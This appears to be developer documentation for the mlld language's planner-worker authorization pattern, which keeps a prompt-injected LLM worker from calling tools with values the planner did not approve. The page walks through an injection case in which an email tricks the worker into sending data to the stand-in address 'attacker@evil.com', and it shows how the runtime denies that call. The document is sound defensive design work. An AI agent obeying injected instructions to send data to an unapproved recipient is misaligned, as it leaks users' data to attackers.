---
id: pattern-planner
title: Planner-Worker Authorization
brief: Split agent execution into a planner that authorizes and a worker that executes
category: patterns
tags: [patterns, planner, worker, authorization, agents, handles, facts, security]
related: [facts-and-handles, policy-authorizations, security-getting-started, labels-attestations, security-guards-basics]
related-code: [interpreter/eval/exec/policy-fragment.ts, interpreter/policy/authorization-compiler.ts, interpreter/env/builtins/policy.ts, interpreter/utils/handle-resolution.ts]
updated: 2026-03-29
---

The planner-worker pattern splits agent execution into two phases: a planner that decides what to do and authorizes specific tools and values, and a worker that executes under those constraints.

## Why split?

An LLM agent that both decides and executes has one shot to get everything right. If it reads untrusted content (an email with injection), the same LLM that's now influenced also controls tool dispatch.

Splitting creates a security boundary:

- The **planner** runs with read tools that return projected handles, looks up trusted data, and produces an authorization bundle specifying exactly which tools and argument values are allowed
- The **worker** runs under that authorization, can read untrusted content, but can only call tools the planner pre-approved with pre-approved values

The worker can be tricked into *wanting* to send to `attacker@evil.com`. It can't actually do it because the planner never authorized that recipient.

## Structure

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  display: [name, { ref: "email" }]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
} with { controlArgs: ["recipient"] }
```

The `controlArgs` declaration marks `recipient` as a security-relevant parameter. The `ref` on `email` means the LLM sees the value AND gets a handle — it can read the email for reasoning and reference it by handle for tool calls.

### Planner phase

The planner looks up contacts and receives a projected result with `ref` handles:

```json
{
  "name": "Mark Davies",
  "email": { "value": "mark@example.com", "handle": "h_a7x9k2" }
}
```

The planner produces a bucketed authorization intent, organized by proof source:

```json
{
  "resolved": {
    "sendEmail": { "recipient": "h_a7x9k2" }
  },
  "known": {
    "sendEmail": {
      "recipient": {
        "value": "john@example.com",
        "source": "user asked to email john"
      }
    }
  },
  "allow": ["create_file"]
}
```

- `resolved` — handle values from tool results
- `known` — values the user explicitly provided in their task
- `allow` — tools needing no argument constraints

The orchestrator validates it through the policy builder:

```mlld
var @plannerResult = @plan(@task) | @parse
var @auth = @policy.build(@plannerResult.authorizations, @writeTools)
var @result = @worker(@task) with { policy: @auth.policy }
```

The builder treats each bucket with the right proof level. `known` can only come from uninfluenced sources (the clean planner). If the builder drops tools, a guard on the planner exe can retry with the issues as feedback.

### Worker phase

The worker executes under the combined base policy plus validated authorization:

```mlld
var @base = {
  defaults: {
    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
  },
  operations: { "exfil:send": ["exfil:send"] },
  authorizations: {
    deny: ["update_password"]
  }
}
```

At dispatch time:

1. The runtime resolves `h_a7x9k2` to the live contact value with `fact:@contact.email`
2. The authorization guard checks: is `sendEmail` allowed with this recipient? Yes
3. The inherited positive check runs: does `recipient` carry fact proof or `known`? Yes
4. `no-untrusted-destructive` scopes to control args — `recipient` has `untrusted` cleared by trust refinement. Tainted data args (subject, body) are not checked.
5. The call proceeds

If injection tricks the worker into calling `sendEmail(recipient: "attacker@evil.com")`:

1. `"attacker@evil.com"` was never emitted as a projected value, so it stays a raw literal
2. The authorization guard checks: does this match the pinned value? No
3. Call denied

If the worker copies a masked preview that uniquely matches a projected contact, mlld canonicalizes it back to the live value before the same authorization and positive checks run. If the preview is ambiguous, the runtime fails closed and tells the model to use the handle wrapper.

## Key properties

### Control args are mandatory

Declare control args on write executables with `with { controlArgs: [...] }`. If a `tool:w` exe has no `controlArgs` metadata, built-in send/destroy checks fail closed for that operation.

### Data args are stripped from authorization

The planner doesn't need to know which args are control args. If the planner includes data args (title, description, start_time, etc.) in the authorization, the runtime silently strips them at compilation time. Only declared `controlArgs` are compiled into authorization constraints.

This avoids mismatches where the planner pins a data arg value and the worker produces a slightly different one. The planner can be thorough — the runtime only enforces what's security-relevant.

### Inherited positive checks

Authorization alone is not enough. Even with a planner-approved value, inherited positive checks from the base policy still apply:

- `no-send-to-unknown` requires fact proof or `known` on destination args
- `no-destroy-unknown` requires fact proof or `known` on target args

When `controlArgs` is explicitly declared, any `fact:*` label satisfies the check — the developer already asserted which args are destinations. If the planner pins a value that carried `known` or a matching `fact:` label at plan time, the authorization guard carries that proof forward. If the planner proposes a proofless literal, `@policy.build` drops it and hand-built `with { policy }` rejects it before dispatch.

### Tolerant comparison

The worker can pass *less* than authorized (fewer recipients) but not *more*. Args not mentioned in the constraint are enforced as empty/null, so silent omission never becomes an open hole.

The runtime does not rewrite arbitrary payloads or tool schemas. Tolerant boundary matching only applies to security-relevant args and only for exact projected forms the runtime emitted.

### Locked policies

`locked: true` on the base policy prevents authorization overrides entirely. Use this when you want planner-produced authorizations to be informational rather than permissive.

## Validation

`mlld validate` catches authorization issues before execution:

- Control args not constrained in the authorization
- Tools authorized with `true` (unconstrained) when they have declared control args
- Missing control-arg metadata on `tool:w` executables

## Worker returns with handle field type

Workers that pass security-critical values across phases should return handle-bearing structures. The `handle` field type enforces this:

```mlld
record @reader_result = {
  facts: [channel: handle],
  data: [needs_reply: boolean, summary: string]
}

exe @readWorker(task) = @claude(@task, @tools) => reader_result
```

The `handle` type requires a resolvable handle — plain strings fail validation. If the LLM returns `"general"` instead of copying the handle from the tool result, `=> record` validation fails and a guard can retry.

## Named display modes

Different agents need different visibility. Use named modes and box config:

```mlld
record @email_msg = {
  facts: [from: string, message_id: string],
  data: [subject: string, body: string, needs_reply: boolean],
  display: {
    worker: [{ mask: "from" }, subject, body],
    planner: [{ ref: "from" }, { ref: "message_id" }, needs_reply]
  }
}

box @worker with { tools: [@readEmail], display: "worker" } [...]
box @planner with { tools: [@searchContacts], display: "planner" } [...]

>> Or per call-site without boxes:
var @readResult = @claude(@prompt, { tools: @readTools }) with { display: "worker" }
var @plan = @claude(@prompt, { tools: @plannerTools }) with { display: "planner" }
```

Call-site `with { display }` overrides box-level display. Overrides can only restrict, never widen.

Worker sees subject and body (its job), from is masked. Planner sees from and message_id as ref, sees needs_reply, doesn't see subject or body (injection surfaces omitted).

## Full example

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  display: [name, { ref: "email" }],
  when [
    internal => :internal
    * => :external
  ]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
} with { controlArgs: ["recipient"] }

var @base = {
  defaults: {
    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
  },
  operations: { "exfil:send": ["exfil:send"] }
}

>> Step 1: Planner calls @searchContacts, gets ref handle on email
>> Step 2: Planner produces bucketed intent
var @plannerResult = @plan(@task) | @parse

>> Step 3: Builder validates intent against tools and policy
var @auth = @policy.build(@plannerResult.authorizations, @writeTools)

>> Step 4: Worker runs under validated policy
show @sendEmail(@contacts.email, "Following up", "Hi Mark...") with { policy: @auth.policy }
```

See `facts-and-handles` for how records, facts, projections, and handles work. See `policy-authorizations` for the full authorization syntax.
